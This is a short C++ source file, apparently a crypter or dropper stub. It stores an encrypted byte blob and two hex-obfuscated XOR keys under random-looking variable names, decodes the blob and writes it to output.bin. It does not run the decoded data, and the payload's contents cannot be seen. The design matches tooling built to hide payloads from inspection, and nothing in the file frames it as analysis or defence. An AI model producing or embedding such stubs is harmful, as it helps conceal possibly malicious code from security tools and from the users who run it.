
#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdint>

// Minimal stub with embedded data
std::string Apt46005 = "\x36\x65\x31\x64\x30\x32\x33\x31\x66\x36\x65\x64\x39\x65\x32\x36\x65\x34\x61\x64\x34\x66\x39\x63\x31\x36\x35\x61\x33\x62\x38\x66";
std::string fBCnjU4I = "\x30\x66\x36\x38\x63\x65\x35\x38\x39\x35\x66\x63\x39\x34\x66\x32\x34\x64\x38\x33\x35\x66\x64\x35\x62\x38\x39\x36\x32\x64\x38\x30";

int main() {
    uint8_t data[] = {0x9c, 0x09, 0x50, 0x64, 0xd0, 0xfc, 0xa6, 0xfa, 0xa2, 0xc0, 0xed, 0x59, 0xf3, 0x20, 0x4d, 0x3b, 0x06, 0xc5, 0x46, 0xa5, 0x43, 0x89, 0xd0, 0x7c, 0xb1, 0x61, 0xbd, 0xf6, 0x62, 0x75, 0x9c, 0x5b, 0x7d, 0x77, 0xef, 0x9f, 0x9e, 0x5b, 0xfe, 0x4f, 0x43, 0x6d, 0x27, 0x03, 0xa8, 0xfa, 0x6a, 0x0b, 0xd0, 0x48, 0x94, 0x53, 0xae, 0x1b, 0x10, 0x15, 0xe1, 0x04, 0x19, 0x40, 0xe5, 0x30, 0x57, 0xa0, 0xa0, 0xc3, 0xb5, 0x33, 0xe9, 0xf0, 0x78, 0x38, 0x30, 0x46, 0x5b, 0x70, 0xd6, 0xa1, 0x01, 0x3e, 0x40, 0xac, 0x9b, 0xaa, 0xb8, 0x84, 0x3a, 0xb6, 0x22, 0xcd, 0x17, 0xa4, 0x93, 0xe4, 0xba, 0xf5, 0x99, 0x38, 0x41, 0x9a, 0x40, 0xdc, 0x04, 0x3c, 0x83, 0x5c, 0xc1, 0x39, 0xff, 0x2e, 0xe3, 0x3d, 0x6a, 0x27, 0xe6, 0x03, 0x03, 0x10, 0xcb, 0x09, 0xcb, 0x56, 0x13, 0x68, 0x1f, 0xa3, 0x53, 0x78, 0x86, 0xad, 0x2a, 0xa3, 0x99, 0x18, 0x93, 0xcc, 0x0b, 0x95, 0x11, 0x27, 0xd7, 0x9a, 0xcb, 0xae, 0xdc, 0xb6, 0x26, 0xc8, 0x85, 0x91, 0xb0, 0x56, 0x69, 0x87, 0xc2, 0x56, 0x6f, 0x94, 0x5b, 0xe9, 0xb5, 0x85, 0xe9, 0xfa, 0xc5, 0x80, 0xc7};
    size_t size = sizeof(data);
    
    // Simple XOR decryption
    for (size_t i = 0; i < size; i++) {
        data[i] ^= Apt46005[i % 16] ^ fBCnjU4I[i % 16];
    }
    
    std::ofstream out("output.bin", std::ios::binary);
    out.write(reinterpret_cast<char*>(data), size);
    return 0;
}
